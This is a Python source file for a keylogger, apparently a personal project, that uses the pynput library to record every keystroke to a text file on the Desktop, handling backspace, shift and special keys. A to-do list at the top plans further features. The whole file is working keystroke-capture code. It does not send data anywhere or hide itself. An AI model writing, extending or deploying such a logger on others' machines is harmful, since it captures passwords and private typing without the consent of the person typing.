'''
Things to add to keylogger
1. Completed -- allow shift to be held and now continuously print shift to log_file
2. Completed -- incorporate backspace as a character deletion instead of a printed name of key
3. build functionality to have keylogger save to different files with name adjusting to not overwrite old files
'''

import datetime
import os
import logging
from pynput.keyboard import Key, Listener

# Global Variables for special conditions
n = 0 # tracks when program is started and iterates to not duplicate action
shift_pressed = False # tracks if shift is pressed its set to true and on release is set to false again


log_dir = r"C:/users/modri/Desktop/" # Directory that keylog file gets saved to
# configuration of the log library to save file name, set log level, and format message
logging.basicConfig(
    filename=(log_dir + "keyLog.txt"),
    level=logging.DEBUG,
    format='%(message)s'
)


def on_press(key): # function for when a key is pressed
    global n, shift_pressed
    with open(log_dir + "keylog.txt", "a") as log_file: # Opens file specified by log_dir as append
        if n < 1: # if statement to only write datetime.now once at the start of program
            current_time = datetime.datetime.now()
            log_file.write('\n' + str(current_time) + '\n')
            n += 1
        try:
            log_file.write(f"{key.char}") # writes key.char to log_file
        except AttributeError: # handles when key is not key.char (i.e special characters [space],[enter])
            if key == Key.space:
                log_file.write(" ")  # logs an actual space instead of "space"
            elif key == Key.enter:
                log_file.write("\n") # logs new line on enter for better readability
            elif key == Key.backspace:
                log_file.seek(0, os.SEEK_END)  # moves cursor to end of file
                if log_file.tell() > 0:
                    log_file.truncate(log_file.tell() - 1)
                    # removes last character in log file when backspace is
                    # pressed to make language clearer on typos logged
            elif key == Key.shift: # handles when shift is held down it doesn't print continuously
                if not shift_pressed:
                    log_file.write(f"[{key.name}]")
                    shift_pressed = True
            # -----elif add additional key exceptions here-----
            else: # handles all other keys not specified above
                log_file.write(f"[{key.name if hasattr(key, 'name') else key}]")


def on_release(key): # defines on release of key actions
    global shift_pressed
    if key == Key.shift:
        shift_pressed = False


with Listener(on_press=on_press, on_release=on_release) as listener:
    # starts listener setting on_press and on_release options to the respective functions defined above
    listener.join()
